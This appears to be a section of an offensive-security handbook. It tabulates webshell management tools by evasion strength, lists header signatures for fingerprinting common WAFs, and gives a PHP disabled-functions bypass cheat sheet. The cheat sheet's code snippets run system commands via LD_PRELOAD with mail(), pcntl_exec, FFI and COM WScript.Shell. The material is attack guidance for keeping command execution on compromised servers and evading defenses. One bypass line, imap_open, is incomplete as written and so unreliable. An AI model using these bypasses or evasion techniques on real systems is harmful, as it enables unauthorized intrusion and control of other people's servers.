## 11. TOOL INTEGRATION REFERENCE

### 11.1 Common WebShell Management Tool Comparison

| Tool | Encryption | Protocol | Evasion Level | Language Support |
|---|---|---|---|---|
| AntSword (蚁剑) | Custom encoders | HTTP/HTTPS | Medium | PHP, ASP, ASPX, JSP, Custom |
| Behinder (冰蝎) | AES + DH key exchange | HTTP/HTTPS, WebSocket | High | PHP, ASP, ASPX, JSP, Java |
| Godzilla (哥斯拉) | AES + custom cipher | HTTP/HTTPS | Very High | PHP, ASP, ASPX, JSP, Java, C# |
| Weevely | Custom obfuscation | HTTP/HTTPS | Medium | PHP |
| QuasiBot | XOR + Base64 | HTTP/HTTPS | Low | PHP |

### 11.2 WAF Fingerprinting Quick Reference

| WAF | Header Signature | Behavior |
|---|---|---|
| Cloudflare | `cf-ray`, `cf-cache-status`, `__cfduid` | 403 with Cloudflare branded page |
| Alibaba Cloud WAF | `ali-cdn`, `x-cache`, `eagleeye-traceid` | 405 with Alibaba branded page |
| Tencent Cloud WAF | `x-cos-request-id`, `x-nws-log-uuid` | 403 with Tencent branded page |
| Imperva | `x-iinfo`, `x-cdn`, `x-request-id` | 403 with Imperva branded page |
| AWS WAF | `x-amzn-requestid`, `x-amz-cf-id` | 403 with AWS branded page |
| Akamai | `x-akamai-*`, `x-cache-key` | 403/redirect to block page |
| F5 BIG-IP | `X-WA-Info`, `X-Cnection` | 403 with BIG-IP cookie |
| ModSecurity | (varies, typically no brand) | 403/406 with generic error |
| Sucuri | `x-sucuri-id`, `x-sucuri-cache` | 403 with Sucuri branded page |

### 11.3 PHP Disabled Functions Bypass Reference

```
Common disabled functions and bypasses:

1. system, exec, passthru, shell_exec, popen, proc_open
   Bypass: Use `backticks`, pcntl_exec, mail() + LD_PRELOAD

2. mail() LD_PRELOAD bypass:
   putenv('LD_PRELOAD=/tmp/evil.so');
   mail('a','b','c','d');

3. pcntl_exec:
   pcntl_exec('/bin/sh', ['-c', $cmd]);

4. imap_open() RCE:
   imap_open('{localhost:993/imap/ssl}INBOX', '', '');

5. FFI (PHP 7.4+):
   $ffi = FFI::cdef('int system(const char *command);', 'libc.so.6');
   $ffi->system('id');

6. COM/.NET (Windows):
   $wsh = new COM('WScript.Shell');
   $wsh->Run('cmd.exe /c ' . $cmd, 0, false);

7. PHP CGI + Apache mod_cgi:
   Exploit cgi.force_redirect bypass

8. ImageMagick (via imagick extension):
   Use delegate vulns in ImageMagick policy
```

---

